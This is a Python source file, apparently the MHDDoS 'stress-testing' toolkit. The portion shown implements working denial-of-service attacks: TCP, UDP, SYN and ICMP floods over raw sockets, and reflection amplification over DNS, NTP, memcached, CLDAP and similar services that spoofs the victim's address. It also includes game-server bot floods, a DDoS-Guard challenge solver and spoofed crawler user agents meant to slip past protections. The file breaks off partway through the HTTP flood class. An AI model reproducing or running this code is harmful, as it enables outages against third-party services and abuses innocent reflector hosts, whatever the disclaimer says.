#!/usr/bin/env python3
"""MHDDoS - Layer 4/7 stress-testing toolkit.

For authorized testing and educational use only. Do not use this tool
against systems you do not own or have explicit permission to test.

The script is intentionally a single file: it is executed directly with
``python start.py`` and by the optional web panel.
"""

import argparse
import os
import sys
from base64 import b64encode
from collections.abc import Callable, Iterator
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from multiprocessing import RawValue
from pathlib import Path
from random import choice, randint
from re import compile as re_compile
from socket import (
    AF_INET,
    IP_HDRINCL,
    IPPROTO_ICMP,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    SOCK_DGRAM,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    gethostbyname,
    gethostname,
    socket,
)
from ssl import CERT_NONE, PROTOCOL_TLS_CLIENT, SSLContext, TLSVersion
from struct import pack
from subprocess import run
from threading import Event, Lock, Thread
from time import sleep, time
from typing import Any, Never, Optional
from urllib.parse import quote
from uuid import UUID, uuid4
from warnings import catch_warnings, filterwarnings

from cloudscraper import create_scraper
from dns import resolver
from dns.exception import DNSException
from icmplib import ping
from icmplib.exceptions import ICMPLibError
from impacket.ImpactPacket import ICMP, IP, TCP, UDP, Data
from psutil import (
    Error as PsutilError,
    Process,
    cpu_percent,
    net_io_counters,
    process_iter,
    virtual_memory,
)
from requests import RequestException, Response, Session, get
from yarl import URL

# PyRoxy still uses non-raw regex strings, which emit SyntaxWarning on Python 3.12+.
# Keep its import quiet until upstream fixes the patterns.
with catch_warnings():
    filterwarnings("ignore", category=SyntaxWarning, module=r"PyRoxy")
    from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles, Tools as ProxyTools

__version__ = "2.4"

BASE_DIR = Path(__file__).resolve().parent
SCRIPT_FILE = BASE_DIR / "start.py"
SCRIPT_NAME = Path(sys.argv[0]).name
CONFIG_FILE = BASE_DIR / "config.json"
USER_AGENT_FILE = BASE_DIR / "files" / "useragent.txt"
REFERER_FILE = BASE_DIR / "files" / "referers.txt"
PROXY_DIR = BASE_DIR / "files" / "proxies"
WEB_DIR = BASE_DIR / "web"
WEB_SCRIPTS = WEB_DIR / "scripts"

basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")

# Colors are disabled for piped output (Docker logs, web panel) and when the
# NO_COLOR convention is used.
_USE_COLOR = sys.stdout.isatty() and os.getenv("NO_COLOR") is None


class Color:
    GREEN = "\033[92m" if _USE_COLOR else ""
    WARNING = "\033[93m" if _USE_COLOR else ""
    FAIL = "\033[91m" if _USE_COLOR else ""
    RESET = "\033[0m" if _USE_COLOR else ""


class Methods:
    LAYER7_METHODS = {
        "CFB",
        "BYPASS",
        "GET",
        "POST",
        "OVH",
        "STRESS",
        "DYN",
        "SLOW",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "DGB",
        "AVB",
        "CFBUAM",
        "APACHE",
        "XMLRPC",
        "BOT",
        "DOWNLOADER",
        "KILLER",
        "TOR",
        "RHEX",
        "STOMP",
    }

    LAYER4_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

    LAYER4_METHODS = {
        *LAYER4_AMP,
        "TCP",
        "UDP",
        "SYN",
        "VSE",
        "MINECRAFT",
        "MCBOT",
        "CONNECTION",
        "CPS",
        "FIVEM",
        "FIVEM-TOKEN",
        "TS3",
        "MCPE",
        "ICMP",
        "OVH-UDP",
    }

    ALL_METHODS = {*LAYER4_METHODS, *LAYER7_METHODS}


TOR2WEB = [
    "onion.city",
    "onion.cab",
    "onion.direct",
    "onion.sh",
    "onion.link",
    "onion.ws",
    "onion.pet",
    "onion.rip",
    "onion.plus",
    "onion.top",
    "onion.si",
    "onion.ly",
    "onion.my",
    "onion.lu",
    "onion.casa",
    "onion.com.de",
    "onion.foundation",
    "onion.rodeo",
    "onion.lat",
    "tor2web.org",
    "tor2web.fi",
    "tor2web.blutmagie.de",
    "tor2web.to",
    "tor2web.io",
    "tor2web.in",
    "tor2web.it",
    "tor2web.xyz",
    "tor2web.su",
    "darknet.to",
    "s1.tor-gateways.de",
    "s2.tor-gateways.de",
    "s3.tor-gateways.de",
    "s4.tor-gateways.de",
    "s5.tor-gateways.de",
]

SEARCH_ENGINE_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
]

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

DEFAULT_REFERERS = [
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://www.google.com/translate?u=",
]

EXIT_WORDS = {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}
VALID_PROXY_TYPES = {0, 1, 4, 5, 6}


def die(*message: object, code: int = 1) -> Never:
    """Log an error and terminate with ``code``."""
    if message:
        logger.error("%s%s%s", Color.FAIL, " ".join(str(part) for part in message), Color.RESET)
    shutdown()
    raise SystemExit(code)


def load_config() -> dict:
    try:
        with CONFIG_FILE.open(encoding="utf-8") as handle:
            return load(handle)
    except (OSError, ValueError) as exc:
        die(f"Cannot read {CONFIG_FILE.name}: {exc}")


def resolve_host(host: str) -> str:
    try:
        return gethostbyname(host)
    except OSError as exc:
        die(f"Cannot resolve hostname {host}: {exc}")


def local_ip() -> str:
    """Best-effort local IP used as the spoofed source for raw packets."""
    try:
        with socket(AF_INET, SOCK_DGRAM) as sock:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"


LOCAL_IP = local_ip()

# Verification is disabled by design; one context is reused for all connections.
_SSL_CONTEXT = SSLContext(PROTOCOL_TLS_CLIENT)
_SSL_CONTEXT.check_hostname = False
_SSL_CONTEXT.verify_mode = CERT_NONE
_SSL_CONTEXT.minimum_version = TLSVersion.TLSv1_2


def read_wordlist(path: Path, label: str) -> set[str]:
    if not path.exists():
        die(f"The {label} file doesn't exist: {path}")

    words = {}

    try:
        words = {
            line.strip() for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
        }
    except OSError as exc:
        die(f"Cannot read {label} file {path}: {exc}")

    words.discard("")

    if not words:
        die(f"Empty {label} file: {path}")
    return words


def read_reflectors(path: Path) -> set[str]:
    if not path.exists():
        die(f"The reflector file doesn't exist: {path}")

    content = ""

    try:
        content = path.read_text(encoding="utf-8", errors="ignore")
    except OSError as exc:
        die(f"Cannot read reflector file {path}: {exc}")

    reflectors = set(Tools.IP.findall(content))

    if not reflectors:
        die(f"Empty reflector file: {path}")

    return reflectors


def host_only(value: str) -> str:
    value = value.replace("https://", "").replace("http://", "")
    return value.split("/")[0]


def filename_arg(value: str, label: str) -> str:
    """Return a bare filename, rejecting empty values, paths, and traversal."""
    filename = value.strip()
    if not filename or filename in {".", ".."} or Path(filename).name != filename:
        die(f"{label} must be a bare filename, got {value!r}")
    return filename


def run_web_panel() -> None:
    """Start the bundled Node web panel using the platform launcher."""
    if not WEB_DIR.is_dir():
        die("The web panel is not available in this installation.")
    if not (WEB_DIR / "node_modules").is_dir():
        die(
            "Web panel dependencies are missing. Run web/scripts/install.bat on Windows "
            "or bash web/scripts/install.sh on Linux/macOS first."
        )
    if os.name == "nt":
        command = ["cmd", "/c", str(WEB_SCRIPTS / "start.bat")]
    else:
        command = ["bash", str(WEB_SCRIPTS / "start.sh")]

    code = 0

    try:
        code = run(command, cwd=WEB_DIR, check=False).returncode
    except OSError as exc:
        die(f"Cannot start the web panel: {exc}")

    raise SystemExit(code)


class Counter:
    """Counter shared between threads (and safe to read from the main thread)."""

    __slots__ = ("_value",)

    def __init__(self, value: int = 0) -> None:
        self._value = RawValue("q", value)

    def add(self, value: int) -> None:
        self._value.value += value

    def __int__(self) -> int:
        return int(self._value.value)

    def reset(self) -> None:
        self._value.value = 0


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = re_compile(r"(?:\d{1,3}\.){3}\d{1,3}")
    PROTOCOL = re_compile(rb'"protocol"\s*:\s*(\d+)')

    @staticmethod
    def human_bytes(size: float, binary: bool = False, precision: int = 2) -> str:
        if size <= 0:
            return "-- B"
        base = 1024 if binary else 1000
        suffixes = ["B", "kB", "MB", "GB", "TB", "PB", "EB"]
        index = 0
        while size >= base and index < len(suffixes) - 1:
            size /= base
            index += 1
        suffix = suffixes[index] if index == 0 or not binary else f"{suffixes[index][0]}iB"
        return f"{size:.{precision}f} {suffix}"

    @staticmethod
    def human_format(number: int, precision: int = 2) -> str:
        if number <= 999:
            return str(number)
        suffixes = ["", "k", "m", "g", "t", "p"]
        index = 0
        value = float(number)
        while value >= 1000 and index < len(suffixes) - 1:
            value /= 1000
            index += 1
        return f"{value:.{precision}f}{suffixes[index]}"

    @staticmethod
    def size_of_request(response: Response) -> int:
        size = len(response.request.method) + len(response.request.url)
        size += len(
            "\r\n".join(f"{key}: {value}" for key, value in response.request.headers.items())
        )
        return size

    @staticmethod
    def send(sock: socket, packet: bytes) -> bool:
        sent = sock.send(packet)
        if not sent:
            return False
        BYTES_SEND.add(sent)
        REQUESTS_SENT.add(1)
        return True

    @staticmethod
    def send_all(sock: socket, packet: bytes) -> bool:
        """Send a complete protocol packet (no partial writes)."""
        sock.sendall(packet)
        BYTES_SEND.add(len(packet))
        REQUESTS_SENT.add(1)
        return True

    @staticmethod
    def sendto(sock: socket, packet: bytes, target: tuple[str, int]) -> bool:
        sent = sock.sendto(packet, target)
        if not sent:
            return False
        BYTES_SEND.add(sent)
        REQUESTS_SENT.add(1)
        return True

    @staticmethod
    def dgb_solver(url: str, user_agent: str, proxy: Optional[dict] = None) -> Session:
        """Solve the DDoS-Guard JS challenge and return a ready session."""
        session = Session()
        if proxy:
            session.proxies = proxy
        base_headers = {
            "User-Agent": user_agent,
            "Accept-Language": "en-US",
            "Connection": "keep-alive",
            "Sec-Fetch-Site": "none",
            "DNT": "1",
        }
        failed = True
        try:
            with session.get(
                url,
                headers={
                    **base_headers,
                    "Accept": "text/html",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "TE": "trailers",
                },
            ) as response:
                for key, value in response.cookies.items():
                    session.cookies.set(key, value)

            challenge_id = None
            with session.post(
                "https://check.ddos-guard.net/check.js",
                headers={
                    **base_headers,
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": url,
                    "Sec-Fetch-Dest": "script",
                    "Sec-Fetch-Mode": "no-cors",
                    "Sec-Fetch-Site": "cross-site",
                },
            ) as response:
                for key, value in response.cookies.items():
                    if key == "__ddg2":
                        challenge_id = value
                    session.cookies.set(key, value)

            if challenge_id:
                with session.get(
                    f"{url.rstrip('/')}/.well-known/ddos-guard/id/{challenge_id}",
                    headers={
                        **base_headers,
                        "Accept": "image/webp,*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Cache-Control": "no-cache",
                        "Referer": url,
                        "Sec-Fetch-Dest": "script",
                        "Sec-Fetch-Mode": "no-cors",
                        "Sec-Fetch-Site": "cross-site",
                    },
                ) as response:
                    for key, value in response.cookies.items():
                        session.cookies.set(key, value)
            failed = False
        finally:
            if failed:
                session.close()
        return session

    @staticmethod
    def safe_close(sock: Any) -> None:
        if sock is not None:
            with suppress(OSError):
                sock.close()


class Minecraft:
    @staticmethod
    def varint(number: int) -> bytes:
        output = b""
        while True:
            byte = number & 0x7F
            number >>= 7
            output += pack("B", byte | (0x80 if number > 0 else 0))
            if number == 0:
                return output

    @staticmethod
    def data(*payload: bytes) -> bytes:
        joined = b"".join(payload)
        return Minecraft.varint(len(joined)) + joined

    @staticmethod
    def short(number: int) -> bytes:
        return pack(">H", number)

    @staticmethod
    def long(number: int) -> bytes:
        return pack(">q", number)

    @staticmethod
    def handshake(target: tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def handshake_forwarded(
        target: tuple[str, int], version: int, state: int, ip: str, uuid: UUID
    ) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        packet_id = 0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00
        return Minecraft.data(Minecraft.varint(packet_id), Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, number: int) -> bytes:
        packet_id = (
            0x0F
            if protocol >= 755
            else 0x10
            if protocol >= 712
            else 0x0F
            if protocol >= 471
            else 0x10
            if protocol >= 464
            else 0x0E
            if protocol >= 389
            else 0x0C
            if protocol >= 386
            else 0x0B
            if protocol >= 345
            else 0x0A
            if protocol >= 343
            else 0x0B
            if protocol >= 336
            else 0x0C
            if protocol >= 318
            else 0x0B
            if protocol >= 107
            else 0x00
        )
        payload = Minecraft.long(number) if protocol >= 339 else Minecraft.varint(number)
        return Minecraft.data(Minecraft.varint(packet_id), payload)

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        packet_id = (
            0x03
            if protocol >= 755
            else 0x03
            if protocol >= 464
            else 0x02
            if protocol >= 389
            else 0x01
            if protocol >= 343
            else 0x02
            if protocol >= 336
            else 0x03
            if protocol >= 318
            else 0x02
            if protocol >= 107
            else 0x01
        )
        return Minecraft.data(Minecraft.varint(packet_id), Minecraft.data(message.encode()))


class FloodWorker(Thread):
    """Shared worker lifecycle: stop event, error logging, and backoff.

    Network errors such as ``EMFILE`` (ulimit), ephemeral-port exhaustion, or
    ``ENETUNREACH`` are usually transient. Workers must keep running and retry
    with a short backoff instead of spinning or dying silently.
    """

    _send: Callable[[], None]
    _error_lock = Lock()
    _last_error_log = 0.0
    _error_log_interval = 5.0

    def __init__(self, event: Optional[Event]) -> None:
        super().__init__(daemon=True)
        self._event = event

    def run(self) -> None:
        if self._event is not None:
            self._event.wait()
        while self._is_running():
            try:
                self._send()
            # noinspection PyBroadException
            except Exception as exc:  # noqa: BLE001 - the worker must survive any failure
                self._report_error(exc)

    def _is_running(self) -> bool:
        return self._event is None or self._event.is_set()

    def _report_error(self, exc: Exception) -> None:
        now = time()
        with FloodWorker._error_lock:
            should_log = now - FloodWorker._last_error_log >= self._error_log_interval
            if should_log:
                FloodWorker._last_error_log = now
        if should_log:
            logger.warning("%s worker error: %s (retrying with backoff)", self._send.__name__, exc)
        sleep(0.1)

    def _run_guarded(self, target: Callable[[], None]) -> None:
        """Run a spawned helper (connection keep-alive, killer request) safely."""
        try:
            target()
        # noinspection PyBroadException
        except Exception as exc:  # noqa: BLE001 - helper thread boundary
            self._report_error(exc)


class Layer4(FloodWorker):
    """Layer 3/4 flood worker. One instance per thread."""

    AMP_PAYLOADS = {
        "RDP": (
            b"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00",
            3389,
        ),
        "CLDAP": (
            b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00"
            b"\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00",
            389,
        ),
        "MEM": (b"\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n", 11211),
        "CHAR": (b"\x01", 19),
        "ARD": (b"\x00\x14\x00\x00", 3283),
        "NTP": (b"\x17\x00\x03\x2a\x00\x00\x00\x00", 123),
        "DNS": (
            b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00"
            b"\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00",
            53,
        ),
    }

    METHOD_NAMES = {
        "UDP": "_udp",
        "SYN": "_syn",
        "VSE": "_vse",
        "TS3": "_ts3",
        "MCPE": "_mcpe",
        "FIVEM": "_fivem",
        "FIVEM-TOKEN": "_fivem_token",
        "OVH-UDP": "_ovh_udp",
        "MINECRAFT": "_minecraft",
        "CPS": "_cps",
        "CONNECTION": "_connection",
        "MCBOT": "_mcbot",
    }

    # Methods that accept a Layer 4 proxy list.
    PROXY_METHODS = {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}

    def __init__(
        self,
        target: tuple[str, int],
        method: str = "TCP",
        event: Optional[Event] = None,
        *,
        ref: Optional[set[str]] = None,
        proxies: Optional[set[Proxy]] = None,
        protocol_id: int = 74,
        mcbot_prefix: str = "MHDDoS_",
    ):
        super().__init__(event)
        self._target = target
        self._ref = list(ref or ())
        self._proxies = list(proxies or ())
        self.protocol_id = protocol_id
        self._mcbot_prefix = mcbot_prefix
        self._amp_payload: Optional[tuple[bytes, int]] = None
        self._amp_payloads = cycle([])

        if method in self.AMP_PAYLOADS:
            if not self._ref:
                raise ValueError(f"{method} requires a reflector list")
            self._amp_payload = self.AMP_PAYLOADS[method]
            self._amp_payloads = cycle(self._generate_amp())
            self._send = self._amp
        elif method == "ICMP":
            self._target = (target[0], 0)
            self._send = self._icmp
        else:
            self._send = getattr(self, self.METHOD_NAMES.get(method, "_tcp"))

    def _open_connection(self) -> socket:
        if self._proxies:
            sock = choice(self._proxies).open_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        else:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        connected = False
        try:
            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            sock.settimeout(0.9)
            sock.connect(self._target)
            connected = True
        finally:
            if not connected:
                Tools.safe_close(sock)
        return sock

    def _tcp(self) -> None:
        with self._open_connection() as sock:
            while Tools.send(sock, os.urandom(1024)) and self._is_running():
                pass

    def _minecraft(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocol_id, 1)
        ping_packet = Minecraft.data(b"\x00")
        with self._open_connection() as sock:
            while self._is_running():
                Tools.send_all(sock, handshake)
                Tools.send_all(sock, ping_packet)

    def _cps(self) -> None:
        with self._open_connection():
            REQUESTS_SENT.add(1)

    def _connection(self) -> None:
        Thread(target=self._run_guarded, args=(self._alive_connection,), daemon=True).start()
        REQUESTS_SENT.add(1)

    def _alive_connection(self) -> None:
        with self._open_connection() as sock:
            while self._is_running() and sock.recv(1):
                pass

    def _udp(self) -> None:
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while Tools.sendto(sock, os.urandom(1024), self._target) and self._is_running():
                pass

    def _ovh_udp(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as sock:
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while self._is_running():
                for payload in self._generate_ovh_udp():
                    Tools.sendto(sock, payload, self._target)

    def _icmp(self) -> None:
        payload = self._generate_icmp()
        with socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as sock:
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(sock, payload, self._target) and self._is_running():
                pass

    def _syn(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as sock:
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while self._is_running():
                Tools.sendto(sock, self._generate_syn(), self._target)

    def _amp(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as sock:
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while self._is_running():
                Tools.sendto(sock, *next(self._amp_payloads))

    def _mcbot(self) -> None:
        with self._open_connection() as sock:
            Tools.send_all(
                sock,
                Minecraft.handshake_forwarded(
                    self._target,
                    self.protocol_id,
                    2,
                    ProxyTools.Random.rand_ipv4(),
                    uuid4(),
                ),
            )
            username = f"{self._mcbot_prefix}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send_all(sock, Minecraft.login(self.protocol_id, username))
            sleep(1.5)
            Tools.send_all(
                sock, Minecraft.chat(self.protocol_id, f"/register {password} {password}")
            )
            Tools.send_all(sock, Minecraft.chat(self.protocol_id, f"/login {password}"))
            while self._is_running() and Tools.send_all(
                sock, Minecraft.chat(self.protocol_id, str(ProxyTools.Random.rand_str(256)))
            ):
                sleep(1.1)

    def _vse(self) -> None:
        payload = (
            b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65"
            b"\x20\x51\x75\x65\x72\x79\x00"
        )
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while Tools.sendto(sock, payload, self._target) and self._is_running():
                pass

    def _fivem_token(self) -> None:
        token = str(uuid4())
        guid = str(randint(76561197960265728, 76561199999999999))
        payload = f"token={token}&guid={guid}".encode()
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while Tools.sendto(sock, payload, self._target) and self._is_running():
                pass

    def _fivem(self) -> None:
        payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while Tools.sendto(sock, payload, self._target) and self._is_running():
                pass

    def _ts3(self) -> None:
        payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while Tools.sendto(sock, payload, self._target) and self._is_running():
                pass

    def _mcpe(self) -> None:
        payload = (
            b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20"
            b"\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e"
            b"\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61"
            b"\x6c\x6c\x73"
        )
        with socket(AF_INET, SOCK_DGRAM) as sock:
            while Tools.sendto(sock, payload, self._target) and self._is_running():
                pass

    def _generate_ovh_udp(self) -> list[bytes]:
        packets = []
        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = [
            "/0/0/0/0/0/0",
            "/0/0/0/0/0/0/",
            "\\0\\0\\0\\0\\0\\0",
            "\\0\\0\\0\\0\\0\\0\\",
            "/",
            "/null",
            "/%00%00%00%00",
        ]
        host, port = self._target
        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(LOCAL_IP)
            ip.set_ip_dst(host)

            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(port)

            payload = (
                f"{choice(methods)} {choice(paths)}".encode()
                + os.urandom(randint(1024, 2048))
                + f" HTTP/1.1\nHost: {host}:{port}\r\n\r\n".encode()
            )
            udp.contains(Data(payload))
            ip.contains(udp)
            packets.append(ip.get_packet())
        return packets

    def _generate_syn(self) -> bytes:
        ip = IP()
        ip.set_ip_src(LOCAL_IP)
        ip.set_ip_dst(self._target[0])
        tcp = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_icmp(self) -> bytes:
        ip = IP()
        ip.set_ip_src(LOCAL_IP)
        ip.set_ip_dst(self._target[0])
        icmp = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self) -> list[tuple[bytes, tuple[str, int]]]:
        payload, port = self._amp_payload
        packets = []
        for reflector in self._ref:
            ip = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(reflector)

            udp = UDP()
            udp.set_uh_dport(port)
            udp.set_uh_sport(self._target[1])

            udp.contains(Data(payload))
            ip.contains(udp)
            packets.append((ip.get_packet(), (reflector, port)))
        return packets


def detect_minecraft_protocol(target: str, port: int, default: int) -> int:
    """Ask the server for its protocol version; fall back to the configured one."""
    try:
        with socket(AF_INET, SOCK_STREAM) as sock:
            sock.settimeout(2)
            Tools.send_all(sock, Minecraft.handshake((target, port), default, 1))
            Tools.send_all(sock, Minecraft.data(b"\x00"))
            data = sock.recv(2048)
    except OSError:
        return default
    match = Tools.PROTOCOL.search(data)
    if not match:
        return default
    protocol = int(match.group(1))
    return protocol if 47 <= protocol <= 758 else default


def _wrap_tls(sock: socket, hostname: str) -> socket:
    context = _SSL_CONTEXT
    context.minimum_version = TLSVersion.TLSv1_2
    context.check_hostname = False
    context.verify_mode = CERT_NONE
    return context.wrap_socket(
        sock,
        server_hostname=hostname,
        server_side=False,
        do_handshake_on_connect=True,
        suppress_ragged_eofs=True,
    )


class HttpFlood(FloodWorker):
    """Layer 7 flood worker. One instance per thread."""

    METHOD_NAMES = {
        "POST": "_post",
        "CFB": "_cfb",
        "CFBUAM": "_cfbuam",
        "XMLRPC": "_xmlrpc",
        "BOT": "_bot",
        "APACHE": "_apache",
        "BYPASS": "_bypass",
        "DGB": "_dgb",
        "OVH": "_ovh",
        "AVB": "_avb",
        "STRESS": "_stress",
        "DYN": "_dyn",
        "SLOW": "_slow",
        "GSB": "_gsb",
        "RHEX": "_rhex",
        "STOMP": "_stomp",
        "NULL": "_null",
        "COOKIE": "_cookies",
        "TOR": "_tor",
        "EVEN": "_even",
        "DOWNLOADER": "_downloader",
        "PPS": "_pps",
        "KILLER": "_killer",
    }

    GET_METHODS = {
        "CFB",
        "CFBUAM",
        "GET",
        "TOR",
        "COOKIE",
        "OVH",
        "EVEN",
        "DYN",
        "SLOW",
        "PPS",
        "APACHE",
        "BOT",
        "RHEX",
        "STOMP",
        "BYPASS",
        "NULL",
        "DOWNLOADER",
        "KILLER",
    }
    POST_METHODS = {"POST", "XMLRPC", "STRESS"}
    HEAD_METHODS = {"GSB", "HEAD"}

    def __init__(
        self,
        target: URL,
        host: str,
        method: str = "GET",
        *,
        rpc: int = 1,
        event: Optional[Event] = None,
